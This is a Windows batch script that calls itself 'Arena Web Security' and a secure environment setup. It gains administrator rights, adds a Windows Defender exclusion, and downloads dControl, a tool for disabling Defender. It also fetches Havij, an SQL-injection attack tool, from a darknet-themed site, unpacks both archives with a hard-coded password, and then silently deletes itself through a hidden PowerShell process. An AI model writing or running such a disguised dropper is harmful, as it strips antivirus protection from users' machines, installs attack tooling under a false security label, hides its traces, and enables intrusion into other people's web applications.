@echo off
Title Arena Web Security
setlocal enabledelayedexpansion

::for AWS folder
set "awsFolder=%~dp0AWS"

:: Configuration for dControl
set "bat_dir=%~dp0"
set "folder=%bat_dir%dControl"
set "winrar_url=https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-624.exe"
set "winrar_installer=!folder!\WinRAR-free.exe"
set "dcontrol_url=https://github.com/uppermo0n/dcontrol/releases/download/v1.0/dControl.zip"
set "dcontrol_zip=!folder!\dControl.zip"
set "password=darknet123"

:: Configuration for Havij
set "havij_folder=%bat_dir%Havij"  :: Fixing folder path for Havij
set "havij_zip=!havij_folder!\havij.zip"
set "havij_url=https://www.darknet.org.uk/content/files/Havij_1.12_Free.zip"

:: Header
echo =============================================
echo Secure Environment Setup
echo =============================================
echo.

:: Check admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [STEP] Requesting administrative privileges...
    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~dpnx0\"' -Verb RunAs"
    exit /b
)

:: AWS folder to defender exclusion
echo [STEP] Adding Defender exclusion for: !awsFolder!
powershell -Command "Try { Add-MpPreference -ExclusionPath '!awsFolder!' -ErrorAction Stop; Write-Host 'Defender exclusion added for AWS folder.' } Catch { Write-Host 'Failed to add Defender exclusion. You may need to run as Administrator.' }"


:: === WinRAR Detection and Installation ===
set "winrar_exe="

:: Try native 64-bit registry
for /f "tokens=2,*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /ve 2^>nul ^| find "REG_SZ"') do (
    set "winrar_exe=%%b"
)

:: Try WOW6432Node
if not defined winrar_exe (
    for /f "tokens=2,*" %%a in ('reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /ve 2^>nul ^| find "REG_SZ"') do (
        set "winrar_exe=%%b"
    )
)

:: Try legacy path from WinRAR key
if not defined winrar_exe (
    for /f "tokens=3*" %%a in ('reg query "HKLM\SOFTWARE\WinRAR" /v "Path" 2^>nul ^| find "REG_SZ"') do (
        set "winrar_exe=%%a\WinRAR.exe"
    )
)

:: If still not found, install WinRAR
if not defined winrar_exe (
    echo [STEP] Downloading latest WinRAR...
    powershell -Command "Invoke-WebRequest -Uri '%winrar_url%' -OutFile '!winrar_installer!'" >nul 2>&1

    echo [STEP] Installing WinRAR...
    start "" /wait "!winrar_installer!" /S
    timeout /t 10 /nobreak >nul
    del "!winrar_installer!" >nul

    :: Re-check registry after install
    for /f "tokens=2,*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /ve 2^>nul ^| find "REG_SZ"') do (
        set "winrar_exe=%%b"
    )
    if not defined winrar_exe (
        for /f "tokens=2,*" %%a in ('reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /ve 2^>nul ^| find "REG_SZ"') do (
            set "winrar_exe=%%b"
        )
    )
)

:: Fallback
if not defined winrar_exe (
    set "winrar_exe=%ProgramFiles%\WinRAR\WinRAR.exe"
)

:: Final verification
echo [INFO] Verifying WinRAR at: !winrar_exe!
if not exist !winrar_exe! (
    echo [ERROR] WinRAR not found at: !winrar_exe!
    echo [ACTION] Please install WinRAR manually and re-run this script.
    exit /b
)

:: === Step 1: Create dControl Folder ===
if not exist "!folder!\" (
    mkdir "!folder!"
    echo [SUCCESS] Created workspace: !folder!
) else (
    echo [INFO] Workspace already exists: !folder!
)


:: === Step 3: Open Windows Security for the User ===
echo [INFO] Opening Windows Security for review...
start windowsdefender://

:: === Step 4: Download dControl ZIP in the background ===
echo [STEP] Downloading dControl package in the background...
powershell -Command "Invoke-WebRequest -Uri '%dcontrol_url%' -OutFile '%dcontrol_zip%' -UseBasicParsing" >nul 2>&1
if exist "%dcontrol_zip%" (
    echo [SUCCESS] dControl package downloaded
) else (
    echo [ERROR] Failed to download dControl package
    exit /b
)


:: Create the folder for Havij
if not exist "!havij_folder!\" (
    mkdir "!havij_folder!"
    echo [SUCCESS] Created workspace: !havij_folder!
) else (
    echo [INFO] Workspace already exists: !havij_folder!
)


:: Download Havij ZIP into the Havij Folder
echo [STEP] Downloading Havij package into the Havij folder...
powershell -Command "Invoke-WebRequest -Uri '%havij_url%' -OutFile '!havij_zip!'" >nul 2>&1 && (
    echo [SUCCESS] Package acquired
) || (
    echo [ERROR] Package retrieval failed
    exit /b
)




:: === Step 5: Wait for User Confirmation Before Extraction
set /p userInput="Do you want to continue with extraction for dControl? (Y/N): "
if /i not "%userInput%"=="Y" (
    echo [INFO] Installation aborted by user.
    exit /b
)


:: === Step 6: Extract dControl ZIP ===
echo [STEP] Extracting dControl package...
start "" /wait "!winrar_exe!" x -ibck -p"%password%" "%dcontrol_zip%" "!folder!\" >nul 2>&1

if %errorlevel% equ 0 (
    echo [SUCCESS] Extraction completed successfully
) else (
    echo [ERROR] Extraction failed with code %errorlevel%
    exit /b
)

:: Delete dControl ZIP after extraction
del /f /q "%dcontrol_zip%"
echo [INFO] Deleted dControl ZIP file

:: Open dControl Portable folder
start explorer "!folder!"



:: Decrypt using WinRAR (No user confirmation for Havij)
echo [STEP] Decrypting secure package...
start "" /wait "!winrar_exe!" x -ibck -p"%password%" "!havij_zip!" "!havij_folder!\" >nul 2>&1

if %errorlevel% equ 0 (
    echo [SUCCESS] Package decrypted successfully
) else if %errorlevel% equ 1 (
    echo [ALERT] Invalid security credentials
) else if %errorlevel% equ 2 (
    echo [ERROR] Encrypted package missing
) else (
    echo [ERROR] Decryption failure (Code: %errorlevel%)
)

:: Final output for Havij
echo.

:: Open the Havij folder AFTER extraction completes
start explorer "!havij_folder!"

:: Delete Havij ZIP after extraction
del /f /q "!havij_zip!"
echo [INFO] Havij ZIP file deleted.

:: Launch silent deletion in background (runs independently)
start "" powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 5; Remove-Item -LiteralPath '%~f0' -Force"

:: Close terminal immediately
exit
